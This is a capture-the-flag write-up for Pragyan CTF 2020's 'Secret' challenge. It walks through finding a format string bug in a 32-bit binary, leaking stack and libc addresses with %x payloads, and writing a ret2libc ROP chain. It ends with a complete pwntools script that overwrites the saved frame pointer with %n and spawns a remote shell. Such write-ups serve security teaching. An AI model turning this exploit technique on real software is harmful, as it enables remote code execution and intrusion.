# Pragyan CTF 2020: Secret.


> Find and submit the flag
>
> [./includes/task](task)

## Write-up
Given the binary,

1. If we try to run the binary as `./task`, and experiment with it, we get the output as 

```bash
$ ./task

1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 1
Enter name: trialtask
Enter date (dd/mm/yyyy): 12/12/2020
Enter length of description: 10
Enter description: Testing


1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 3
Task information:


Name: trialtask
Date: 12/12/2020
Length: 10
Description: Testing

1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 2
Enter name to remove: trialtask
Removed trialtask

1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 3
No pending tasks.

1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 4
```

2. Taking a look at the security features of the binary,

```bash
$ checksec task

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

3. Disassembling the binary using `objdump -D task`, we get the disassembly of the functions in the binary. Looking specifically at the `show_tasks` function,

```bash
$ objdump -D task

08049407 <show_tasks>:
 8049407:	f3 0f 1e fb          	endbr32 
 804940b:	55                   	push   %ebp
 804940c:	89 e5                	mov    %esp,%ebp
 804940e:	53                   	push   %ebx
 804940f:	83 ec 04             	sub    $0x4,%esp
 8049412:	e8 d9 fd ff ff       	call   80491f0 <__x86.get_pc_thunk.bx>
 8049417:	81 c3 e9 2b 00 00    	add    $0x2be9,%ebx
 804941d:	8b 45 08             	mov    0x8(%ebp),%eax
 8049420:	83 c0 08             	add    $0x8,%eax
 8049423:	83 ec 08             	sub    $0x8,%esp
 8049426:	50                   	push   %eax
 8049427:	8d 83 67 e0 ff ff    	lea    -0x1f99(%ebx),%eax
 804942d:	50                   	push   %eax
 804942e:	e8 cd fc ff ff       	call   8049100 <printf@plt>
 8049433:	83 c4 10             	add    $0x10,%esp
 8049436:	8b 45 08             	mov    0x8(%ebp),%eax
 8049439:	8b 40 04             	mov    0x4(%eax),%eax
 804943c:	83 ec 08             	sub    $0x8,%esp
 804943f:	50                   	push   %eax
 8049440:	8d 83 73 e0 ff ff    	lea    -0x1f8d(%ebx),%eax
 8049446:	50                   	push   %eax
 8049447:	e8 b4 fc ff ff       	call   8049100 <printf@plt>
 804944c:	83 c4 10             	add    $0x10,%esp
 804944f:	8b 45 08             	mov    0x8(%ebp),%eax
 8049452:	8b 40 48             	mov    0x48(%eax),%eax
 8049455:	83 ec 08             	sub    $0x8,%esp
 8049458:	50                   	push   %eax
 8049459:	8d 83 7d e0 ff ff    	lea    -0x1f83(%ebx),%eax
 804945f:	50                   	push   %eax
 8049460:	e8 9b fc ff ff       	call   8049100 <printf@plt>
 8049465:	83 c4 10             	add    $0x10,%esp
 8049468:	83 ec 0c             	sub    $0xc,%esp
 804946b:	8d 83 89 e0 ff ff    	lea    -0x1f77(%ebx),%eax
 8049471:	50                   	push   %eax
 8049472:	e8 89 fc ff ff       	call   8049100 <printf@plt>
 8049477:	83 c4 10             	add    $0x10,%esp
 804947a:	8b 45 08             	mov    0x8(%ebp),%eax
 804947d:	8b 00                	mov    (%eax),%eax
 804947f:	83 ec 0c             	sub    $0xc,%esp
 8049482:	50                   	push   %eax
 8049483:	e8 78 fc ff ff       	call   8049100 <printf@plt>
 8049488:	83 c4 10             	add    $0x10,%esp
 804948b:	90                   	nop
 804948c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 804948f:	c9                   	leave  
 8049490:	c3                   	ret  
```
We can see that at instruction `8049483`, the program calls printf without loading anything to the stack. This indicates that printf might be called without a format string, thus causing a format string vulnerability. Comparing it to the output of the binary, we can see that it corresponds to displaying of task description.

4.  Running the binary in gdb, as `gdb task`, we can get the base address of libc, as well as leak out the addresses on the stack through the FMS vulnerability. We can then use those addresses to leak a pointer to our own description string on the heap as well as a return-address pointer into libc.

```bash
gdb➤  info sharedlibrary
From        To          Syms Read   Shared Object Library
0xf7fd4100  0xf7ff0a13  Yes (*)     /lib/ld-linux.so.2
0xf7de71d0  0xf7f3fe0a  Yes (*)     /lib/i386-linux-gnu/libc.so.6
(*): Shared library is missing debugging information.
```

```bash
1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 1
Enter name: leak
Enter date (dd/mm/yyyy): 1234
Enter length of description: 900
Enter description: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x


1. Create task
2. Remove task
3. Display tasks
4. Exit
Enter choice: 3
Task information:


Name: leak
Date: 1234
Length: 900
Description: 
384.804a0a9.8049417.f7fb3000.804c000.ffffce88.804952c.804d1a0.f7fb3000.ffffcec8.80494a1.804d1f0.1.0.804d1a0.804a050.804c000.ffffcec8.8049797.804d1a0.ffffceac.50.0.f7fb33fc.80000.7.3.a.804d1a0.804d550.18634600.ffffcee0.0.0.f7de8fb9.f7fb3000.f7fb3000.0.f7de8fb9

```
We see that the address of the description is leaked out at the 15th offset, that is `804d1a0`, and the libc call is leaked out at the 35th offset, that is `f7de8fb9`.

We can use the leaked addresses to construct an ROP chain to gain a shell. For that, we need the address of `system()` in libc, address of a `/bin/sh` string, and a dummy return address for the ROP call. If we can gain EIP control so that it points to `system()` while the stack pointer points to the ROP chain, we can pop a shell.

5. To find out what version of libc is used, we use the libc return to main address leaked out `f7de8fb9` and disassemble that segment

```bash
gdb➤  disas 0xf7de8fb9
Dump of assembler code for function __libc_start_main:
   0xf7de8ec0 <+0>:	endbr32 
   0xf7de8ec4 <+4>:	call   0xf7f112ad
   0xf7de8ec9 <+9>:	add    eax,0x1ca137
   0xf7de8ece <+14>:	push   ebp
   0xf7de8ecf <+15>:	xor    edx,edx
   0xf7de8ed1 <+17>:	push   edi
   0xf7de8ed2 <+18>:	push   esi
   0xf7de8ed3 <+19>:	push   ebx
   0xf7de8ed4 <+20>:	mov    edi,eax
   0xf7de8ed6 <+22>:	sub    esp,0x4c
```
The `__libc_start_main` function starts at address `f7de8ec0`, and using the offset `ec0` on a [https://libc.blukat.me/](libc database) and trying out the first version on the list, we get the offsets as

```bash
__libc_start_main = 0x01eec0
system = 0x045220
str_bin_sh = 0x18d42d
```

6. To achieve EIP control, we can see that one of the leaked addresses `804952c` is the return address of `show_tasks` to `display_tasks` which is the function that calls it. Therefore, the address that comes before it is the saved frame pointer of the function. If we overwrite the saved frame pointer with a value, we have arbitrary control over the EIP. Thus, we can make the EIP point to the first dword in the ROP chain, and the ESP to point to the second dword.

Given that we cannot control the actual stack we have to position our ROP chain somewhere where we can make it act like a stack. As the task description is allocated on the heap and we have control over the allocation size, we can allocate a sufficient number of bytes and place the ROP chain there.

Hence using the %Ax%Bx%6$n template, we can exploit this vulnerability.

7. In summary, the approach is
- Create a task with a description to leak a pointer into libc
- Determine the addresses of the ROP chain elements
- Create a second task with a description that starts with the ROP chain and ends with a format string pointer leak to get the address of the ROP chain
- Create a third task with a description to overwite the saved frame pointer with the address of the ROP chain
- Trigger the exploit by making the main routine return

Now contructing the exploit, as `exploit.py`,
```python
#!/usr/bin/env python

import re
from pwn import *
from struct import pack
from math import floor

def do_infoleak(h, pointer_offset): 
  name = "leak"
  date = "1337"
  desc_len = "8192"
  desc = "%35$x"

  # Create new contact
  h.sendline("1")
  msg = h.recvuntil('Enter name: ')
  print msg
  h.sendline(name)

  msg = h.recvuntil('Enter date (dd/mm/yyyy): ')
  print msg
  h.sendline(date)

  msg = h.recvuntil('Enter length of description: ')
  print msg
  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg
  h.sendline(desc)

  msg = h.recvuntil('Enter choice: ')
  print msg

  # Display contacts
  h.sendline("3")
  msg = h.recvuntil('Enter choice: ')
  print msg

  # Extract leaked pointers
  libc_ptr = re.findall('.*Description:\s(.*?)\n.*', msg)[0]
  return (int(libc_ptr, 16) - 0xf9 - pointer_offset)

def set_ropchain(h, system_addr, binsh_addr): 
  name = "ropchain"
  date = "1337"
  desc_len = "8192"

  # Dummy return address for system
  dummy = 0x0BADC0DE

  # ROP chain: {system (4 bytes)}{dummy (4 bytes)}{"/bin/sh" (4 bytes)}
  ROP_chain = [system_addr,dummy,binsh_addr]
  # Include FMS leak to get address of ROP chain
  desc = "".join([pack('<I', x) for x in ROP_chain]) + "<%15$x>"

  # Create new contact
  h.sendline("1")
  msg = h.recvuntil('Enter name: ')
  print msg

  h.sendline(name)

  msg = h.recvuntil('Enter date: ')
  print msg
  h.sendline(date)

  msg = h.recvuntil('Enter length of description: ')
  print msg
  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg
  h.sendline(desc)

  msg = h.recvuntil('Enter choice: ')
  print msg

  # Display contacts
  h.sendline("3")
  msg = h.recvuntil('Enter choice: ')
  print msg

  return int(re.findall('.*Description:.*?\<(.*?)\>.*\n.*', msg)[0], 16)

def do_exploit(h, ropchain_addr):
  name = "exploit"
  date = "1"
  desc_len = "900"

  new_ebp = (ropchain_addr - 4)

  part_1 = floor(new_ebp / 2)
  part_2 = part_1 + (new_ebp - (part_1 * 2))

  # Overwrite saved EBP with (ropchain_addr - 4)
  desc_buffer = "%"+str(part_1)+"x%"+str(part_2)+"x%6$n"

  print "[ Sending exploit ]"

  # Create new contact
  h.sendline("1")
  msg = h.recvuntil('Enter name: ')
  print msg
  h.sendline(name)

  msg = h.recvuntil('Enter date: ')
  print msg
  h.sendline(date)

  msg = h.recvuntil('Enter length of description: ')
  print msg
  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg
  h.sendline(desc_buffer)

  msg = h.recvuntil('Enter choice: ')
  print msg

  print "[ Exploit sent ]"

  # Trigger exploit
  print "[ Triggering format string vulnerability ]"

  # Display contacts
  h.sendline("3")
  # Receive printed output until we are back at menu
  msg = h.recvuntil('Enter choice: ')

  print "[ Triggering RCE condition ]"
  # Exit
  h.sendline("4")

  # Waiting for the shell to pop
  h.interactive()

  return

host = 'host'
port = 'port'

offset_libc_start_main = 0x01eec0
offset_system = 0x045220
offset_str_bin_sh = 0x18d42d

h = remote(host, port, timeout = None)

msg = h.recvuntil('Enter choice: ')
print msg

# Use infoleak
libc_base = do_infoleak(h, offset_libc_start_main)
system_addr = (libc_base + offset_system)
binsh_addr = (libc_base + offset_str_bin_sh)

print "[ Leaked libc base address: [0x%x] ]" % libc_base
print "[ '/bin/sh' address: [0x%x] ]" % binsh_addr
print "[ system() address: [0x%x] ]" % system_addr

# Build ROP chain
ropchain_addr = set_ropchain(h, system_addr, binsh_addr)

print "[ Leaked ROP chain address: [0x%x] ]" % ropchain_addr

do_exploit(h, ropchain_addr)

h.close()
```

8. Now we get the shell, and we can run `cat flag.txt`
```bash
$ cat flag.txt
p_ctf{m7_3n3m1e5_ar3_n0_m4tch_f0r_m3!}
```
which provides us with the flag.